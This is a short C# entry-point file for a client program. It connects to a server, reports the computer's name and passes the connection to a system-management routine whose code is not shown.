using Common;
using System.Collections.Generic;

namespace Client
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            if (ServerConnector.ConnectWithServer())
            {
                ServerConnector.SendMessage(SystemManagement.GetComputerName());
                SystemManagement.ManageActions(ServerConnector.Client);
            }
        }
    }
}